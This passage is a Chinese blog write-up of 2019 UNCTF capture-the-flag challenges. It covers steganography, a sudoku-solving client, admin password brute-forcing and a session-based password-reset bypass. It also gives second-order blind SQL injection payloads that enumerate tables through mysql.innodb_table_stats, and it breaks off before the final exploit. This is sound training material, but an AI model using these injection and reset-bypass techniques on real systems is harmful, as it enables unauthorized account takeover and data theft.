<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ctf"><meta name="keywords" content="ctf"><meta name="author" content="Somnus"><meta name="copyright" content="Somnus"><title>2019 UNCTF(安恒杯)题解WriteUp | Somnus's blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#快乐游戏题（100-points）"><span class="toc-number">2.1.</span> <span class="toc-text">快乐游戏题（100 points）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Think（200-points）"><span class="toc-number">2.2.</span> <span class="toc-text">Think（200 points）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#亲爱的-300-points"><span class="toc-number">2.3.</span> <span class="toc-text">亲爱的(300 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hidden-secret（600-points）"><span class="toc-number">2.4.</span> <span class="toc-text">Hidden secret（600 points）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信号不好先挂了-800-points"><span class="toc-number">2.5.</span> <span class="toc-text">信号不好先挂了(800 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#happy-puzzle（800-points）"><span class="toc-number">2.6.</span> <span class="toc-text">happy_puzzle（800 points）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-box（800-points）"><span class="toc-number">2.7.</span> <span class="toc-text">Easy_box（800 points）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#给赵总征婚（300-points）"><span class="toc-number">3.1.</span> <span class="toc-text">给赵总征婚（300 points）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NSB-Reset-Password（300-points）"><span class="toc-number">3.2.</span> <span class="toc-text">NSB Reset Password（300 points）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Twice-injection-500-points"><span class="toc-number">3.3.</span> <span class="toc-text">Twice_injection(500 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin-600-points"><span class="toc-number">3.4.</span> <span class="toc-text">checkin(600 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的备忘录-800-points"><span class="toc-number">3.5.</span> <span class="toc-text">简单的备忘录(800 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#加密的备忘录-1000-points"><span class="toc-number">3.6.</span> <span class="toc-text">加密的备忘录(1000 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#审计一下世界上最好的语言吧（1000-points）"><span class="toc-number">3.7.</span> <span class="toc-text">审计一下世界上最好的语言吧（1000 points）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass（800-points）"><span class="toc-number">3.8.</span> <span class="toc-text">bypass（800 points）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-admin（1000-points）"><span class="toc-number">3.9.</span> <span class="toc-text">easy_admin（1000 points）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-pentest（1000-points）"><span class="toc-number">3.10.</span> <span class="toc-text">easy_pentest（1000 points）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#K-amp-K战队的老家（1000-points）"><span class="toc-number">3.11.</span> <span class="toc-text">K&amp;K战队的老家（1000 points）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyrop"><span class="toc-number">4.1.</span> <span class="toc-text">babyrop</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-number">5.</span> <span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#666"><span class="toc-number">5.1.</span> <span class="toc-text">666</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#奇怪的数组"><span class="toc-number">5.2.</span> <span class="toc-text">奇怪的数组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-Android"><span class="toc-number">5.3.</span> <span class="toc-text">Easy-Android</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabyXor"><span class="toc-number">5.4.</span> <span class="toc-text">BabyXor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-Maze"><span class="toc-number">5.5.</span> <span class="toc-text">Easy_Maze</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">6.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#不仅仅是RSA"><span class="toc-number">6.1.</span> <span class="toc-text">不仅仅是RSA</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">79</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">15</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">25</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io" target="_blank" rel="noopener">osword</a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">2019 UNCTF(安恒杯)题解WriteUp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-10-28</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/">ctf</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>2019 UNCTF（安恒杯）WriteUp<a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>肝了7天的比赛，没想到最后拿了个第一名（估计大佬们都去字节跳动和xctf-final了2333）。Web共解11题其中6个一血，1个三血</p>
<p>附上战绩图：</p>
<p><img src="../../../../img/UNCTF/53.png" alt=""></p>
<p><img src="../../../../img/UNCTF/86.png" alt=""></p>
<p><img src="../../../../img/UNCTF/87.png" alt=""></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="快乐游戏题（100-points）"><a href="#快乐游戏题（100-points）" class="headerlink" title="快乐游戏题（100 points）"></a>快乐游戏题（100 points）</h3><p>游戏通关即得flag</p>
<p><img src="../../../../img/UNCTF/52.png" alt=""></p>
<h3 id="Think（200-points）"><a href="#Think（200-points）" class="headerlink" title="Think（200 points）"></a>Think（200 points）</h3><p>执行<strong>check（checknum）</strong>函数，参数是随意一个数字即可</p>
<p><img src="../../../../img/UNCTF/92.png" alt=""></p>
<h3 id="亲爱的-300-points"><a href="#亲爱的-300-points" class="headerlink" title="亲爱的(300 points)"></a>亲爱的(300 points)</h3><p>亲爱的.mp3分离得到压缩包，需要解压密码，注意到压缩包的提示：<strong>qmusic 2019.7.27 17:47</strong></p>
<p>去qq音乐找到海阔天空，李现的歌，对应时间的评论：<strong>真的上头</strong>，为压缩包密码</p>
<p>解压得到一个jpg，分离得到一个xml文件夹，flag在<strong>word/media/image1.jpg</strong></p>
<p>flag：UNCTF{W3_L0v3_Unctf}</p>
<h3 id="Hidden-secret（600-points）"><a href="#Hidden-secret（600-points）" class="headerlink" title="Hidden secret（600 points）"></a>Hidden secret（600 points）</h3><p>题目给了三个文件，第一个文件<strong>1</strong>，开头是<strong>03 04 14 00</strong>，很像压缩包开头，补个<strong>50 4B</strong>，保存成<strong>zip</strong>后，用7-zip打开压缩包，发现2.jpg其中有个1.txt</p>
<p><img src="../../../../img/UNCTF/103.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;K&lt;jslc7b5&apos;gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\\X#9YhiSHV#&quot;</span><br></pre></td></tr></table></figure>

<p>是一串<strong>base92</strong>编码</p>
<p>解码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base92</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"K&lt;jslc7b5'gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\\X#9YhiSHV#"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base92.decode(s)</span><br><span class="line"><span class="string">'unctf&#123;cca1a567c3145b1801a4f3273342c622&#125;'</span></span><br></pre></td></tr></table></figure>

<h3 id="信号不好先挂了-800-points"><a href="#信号不好先挂了-800-points" class="headerlink" title="信号不好先挂了(800 points)"></a>信号不好先挂了(800 points)</h3><p>apple.png存在LSB隐写藏有zip文件，</p>
<p><img src="../../../../img/UNCTF/12.png" alt=""></p>
<p>用stegsolver分离后得到压缩包解压，得到一张相似的图片：<strong>pen.png</strong></p>
<p>因为两张图片长得一样，所以很容易想到可能是藏有盲水印，于是用opencv处理盲水印得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -2 bwm.py decode apple.png pen.png apple_pen.png</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/10.png" alt=""></p>
<p>flag：unctf{9d0649505b702643} </p>
<h3 id="happy-puzzle（800-points）"><a href="#happy-puzzle（800-points）" class="headerlink" title="happy_puzzle（800 points）"></a>happy_puzzle（800 points）</h3><p>题目给的三个提示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint1: png吧 hint2：data不是图⽚，要拼图 hint3：idat数据块</span><br></pre></td></tr></table></figure>

<p>下载下的附件中带有一个<strong>info.txt</strong>文件和很多<strong>.data</strong>文件</p>
<p>info.txt中：mode=RGB size=400x400</p>
<p>告诉我们了图片的宽和高都是<strong>400</strong></p>
<p>然后给的这些<strong>.data</strong>文件都是idat数据块中的<strong>DATA</strong>部分</p>
<p>参考png文件格式：<a href="https://www.ffutop.com/posts/2019-05-10-png-structure/" target="_blank" rel="noopener">https://www.ffutop.com/posts/2019-05-10-png-structure/</a> </p>
<p>png文件格式：PNG文件头+IHDR+IDAT+IEND</p>
<p>（1）构造PNG头：89 50 4E 47 0D 0A 1A 0A</p>
<p>（2）构造IHDR：   00 00 00 0D 49 48 44 52 00 00 01 90 00 00 01 90 08 02 00 00 00 00 00 00 00</p>
<p>（3）构造IDAT：    00 00 28 00 49 44 41 54 + 每个.data文件中的数据DATA +  00 00 00 00</p>
<p>（4）构造IEND：   00 00 00 00 49 45 4E 44 AE 42 60 82 </p>
<p>由于有很多.data文件，需要一个一个尝试，如果某条拼正确，就能正常显示</p>
<p><img src="../../../../img/UNCTF/104.png" alt=""></p>
<p>最后拼出：</p>
<p><img src="../../../../img/UNCTF/105.png" alt=""></p>
<p>得到flag</p>
<h3 id="Easy-box（800-points）"><a href="#Easy-box（800-points）" class="headerlink" title="Easy_box（800 points）"></a>Easy_box（800 points）</h3><p>数独，网上找个现成的解数独脚本，再写个交互就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">solution</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,board)</span>:</span></span><br><span class="line">		self.b = board</span><br><span class="line">		self.t = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,x,y,value)</span>:</span><span class="comment">#检查每行每列及每宫是否有相同项</span></span><br><span class="line">		<span class="keyword">for</span> row_item <span class="keyword">in</span> self.b[x]:</span><br><span class="line">			<span class="keyword">if</span> row_item == value:</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">		<span class="keyword">for</span> row_all <span class="keyword">in</span> self.b:</span><br><span class="line">			<span class="keyword">if</span> row_all[y] == value:</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get_next</span><span class="params">(self,x,y)</span>:</span><span class="comment">#得到下一个未填项</span></span><br><span class="line">		<span class="keyword">for</span> next_soulu <span class="keyword">in</span> range(y+<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">			<span class="keyword">if</span> self.b[x][next_soulu] == <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">return</span> x,next_soulu</span><br><span class="line">		<span class="keyword">for</span> row_n <span class="keyword">in</span> range(x+<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">			<span class="keyword">for</span> col_n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">				<span class="keyword">if</span> self.b[row_n][col_n] == <span class="number">0</span>:</span><br><span class="line">					<span class="keyword">return</span> row_n,col_n</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>,<span class="number">-1</span> <span class="comment">#若无下一个未填项，返回-1</span></span><br><span class="line"> 	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">try_it</span><span class="params">(self,x,y)</span>:</span><span class="comment">#主循环</span></span><br><span class="line">		<span class="keyword">if</span> self.b[x][y] == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):<span class="comment">#从1到9尝试</span></span><br><span class="line">				self.t+=<span class="number">1</span></span><br><span class="line">				<span class="keyword">if</span> self.check(x,y,i):<span class="comment">#符合 行列宫均无条件 的</span></span><br><span class="line">					self.b[x][y]=i <span class="comment">#将符合条件的填入0格</span></span><br><span class="line">					next_x,next_y=self.get_next(x,y)<span class="comment">#得到下一个0格</span></span><br><span class="line">					<span class="keyword">if</span> next_x == <span class="number">-1</span>: <span class="comment">#如果无下一个0格</span></span><br><span class="line">						<span class="keyword">return</span> <span class="literal">True</span> <span class="comment">#返回True</span></span><br><span class="line">					<span class="keyword">else</span>:    <span class="comment">#如果有下一个0格，递归判断下一个0格直到填满数独</span></span><br><span class="line">						end=self.try_it(next_x,next_y)</span><br><span class="line">						<span class="keyword">if</span> <span class="keyword">not</span> end:  <span class="comment">#在递归过程中存在不符合条件的，即 使try_it函数返回None的项</span></span><br><span class="line">							self.b[x][y] = <span class="number">0</span>  <span class="comment">#回朔到上一层继续</span></span><br><span class="line">						<span class="keyword">else</span>:</span><br><span class="line">							<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> 	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">		res = []</span><br><span class="line">		begin = datetime.datetime.now()</span><br><span class="line">		<span class="keyword">if</span> self.b[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">			self.try_it(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			x,y=self.get_next(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">			self.try_it(x,y)</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> self.b:</span><br><span class="line">			<span class="comment">#print i</span></span><br><span class="line">			res.append(i)</span><br><span class="line">		end = datetime.datetime.now()</span><br><span class="line">		<span class="comment">#print '\ncost time:', end - begin</span></span><br><span class="line">		<span class="comment">#print 'times:',self.t</span></span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"101.71.29.5"</span>,<span class="number">10011</span>)</span><br><span class="line">s = p.recvuntil(<span class="string">"answer :\n"</span>)</span><br><span class="line"></span><br><span class="line">di = re.findall(<span class="string">"\\n|([0-9 ])\|([0-9 ])\|([0-9 ])\|([0-9 ])\|([0-9 ])\|([0-9 ])\|([0-9 ])\|([0-9 ])\|([0-9 ])\|\\n"</span>,s)</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line">d.append(di[<span class="number">9</span>])</span><br><span class="line">d.append(di[<span class="number">11</span>])</span><br><span class="line">d.append(di[<span class="number">13</span>])</span><br><span class="line">d.append(di[<span class="number">15</span>])</span><br><span class="line">d.append(di[<span class="number">17</span>])</span><br><span class="line">d.append(di[<span class="number">19</span>])</span><br><span class="line">d.append(di[<span class="number">21</span>])</span><br><span class="line">d.append(di[<span class="number">23</span>])</span><br><span class="line">d.append(di[<span class="number">25</span>])</span><br><span class="line"></span><br><span class="line">r = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">	e = []</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">		<span class="keyword">if</span> j!= <span class="string">' '</span>:</span><br><span class="line">			e.append(int(j))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			e.append(<span class="number">0</span>)</span><br><span class="line">	r.append(e)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">write_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">	write_lis = []</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">		<span class="keyword">if</span> r[i][j] == <span class="number">0</span>:</span><br><span class="line">			write_lis.append(j)</span><br><span class="line">	write_list.append(write_lis)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print r</span></span><br><span class="line"><span class="comment">#print write_list </span></span><br><span class="line"></span><br><span class="line">res1=solution(r)</span><br><span class="line">res = res1.start()</span><br><span class="line"><span class="comment">#print res</span></span><br><span class="line"><span class="comment">#print write_list</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wri = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> write_list:</span><br><span class="line">	write = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">		w = res[count][j]</span><br><span class="line">		write = write + str(w) + <span class="string">","</span></span><br><span class="line">	<span class="comment">#print write</span></span><br><span class="line">	wri.append(write[:<span class="number">-1</span>])</span><br><span class="line">	count = count + <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> wri</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> wri:</span><br><span class="line">	p.sendline(i)</span><br><span class="line">	<span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/85.png" alt=""></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="给赵总征婚（300-points）"><a href="#给赵总征婚（300-points）" class="headerlink" title="给赵总征婚（300 points）"></a>给赵总征婚（300 points）</h3><p>靶机地址：101.71.29.5:10018  </p>
<p>爆破密码即可，用户admin</p>
<p><img src="../../../../img/UNCTF/40.png" alt=""></p>
<p>这题坑点在后台会动态改admin的密码，所以能不能爆出来纯看运气</p>
<h3 id="NSB-Reset-Password（300-points）"><a href="#NSB-Reset-Password（300-points）" class="headerlink" title="NSB Reset Password（300 points）"></a>NSB Reset Password（300 points）</h3><p>靶机地址：101.71.29.5:10042</p>
<p>打开靶机，发现跟上一题征婚相比，多了一个注册功能，随便注册一个账号登陆</p>
<p><img src="../../../../img/UNCTF/54.png" alt=""></p>
<p>看来还是要登陆<strong>admin</strong></p>
<p>除此以外还有一个<strong>重置密码</strong>功能，因为上一题是爆破，这题就排除这个可能。所以思路就是想办法重置<strong>admin</strong>的密码</p>
<p>重置密码需要通过一个<strong>验证码校验</strong>，验证码是通过发送邮箱获得，但是我们不知道admin的邮箱</p>
<p>另外发现，删了cookie后，原来的账号就不存在了，说明，这题是根据<strong>session</strong>来判断当前用户的，那么就可以猜想，如果我们一开始去修改我们注册的用户，然后利用自己邮箱的验证码通过验证，再用另一个页面同样的<strong>session</strong>去重置admin，而当前重置的密码根据session判断我们要修改的用户（此时已经变成了admin），所以即可成功修改admin的密码</p>
<p><img src="../../../../img/UNCTF/55.png" alt=""></p>
<h3 id="Twice-injection-500-points"><a href="#Twice-injection-500-points" class="headerlink" title="Twice_injection(500 points)"></a>Twice_injection(500 points)</h3><p>靶机地址：101.71.29.5:10002 </p>
<p>打开靶机，发现环境是sql-labs 24关，注入点在<strong>pass_change.php</strong>的修改密码处的用户名字段是直接从Session中取出：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$username= $_SESSION[<span class="string">"username"</span>];</span><br></pre></td></tr></table></figure>

<p>造成了二次注入，注入语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$curr_pass'</span>;</span><br></pre></td></tr></table></figure>

<p>按照原来sql-labs的做法是注册用户名：<strong>admin’#</strong>，然后登陆修改<strong>admin</strong>的密码，但是这题登陆了admin也未拿到flag，说明需要去注入库中的其他信息</p>
<p>还是利用布尔盲注，构造语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">'$pass'</span> where username=<span class="string">'admin'</span> <span class="keyword">and</span> ascii(substr(database(),%d,<span class="number">1</span>))=%d<span class="comment"># and password='$curr_pass';</span></span><br></pre></td></tr></table></figure>

<p>在username字段后构造条件语句，如果条件为真，则修改密码成功，为假则修改密码失败</p>
<p>注出数据库名：<strong>security</strong>，在尝试注表时发现关键字<strong>or</strong>被过滤了，所以不能使用<strong>information_schema</strong></p>
<p>这里因为mysql的版本是<strong>5.7</strong>，所以可以利用自带的<strong>mysql</strong>库中新增的<strong>innodb_table_stats</strong> 这个表，来获得数据库名和表名</p>
<p><img src="../../../../img/UNCTF/3.png" alt=""></p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(database_name) from mysql.innodb_table_stats),%d,1))=%d#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(table_name) from mysql.innodb_table_stats),%d,1))=%d#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()),%d,1))=%d#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(column_name) from sys.schema_auto_increment_columns where table_name=&apos;users&apos;),%d,1))=%d#</span><br></pre></td></tr></table></figure>

<p>获得<strong>fl4g</strong>表：</p>
<p><img src="../../../../img/UNCTF/8.png" alt=""></p>
<p><strong>security.fl4g</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(database_name) from mysql.innodb_table_stats where table_name=&apos;fl4g&apos;),%d,1))=%d#</span><br></pre></td></tr></table></figure>

<p>最后获取flag的exp：</p>
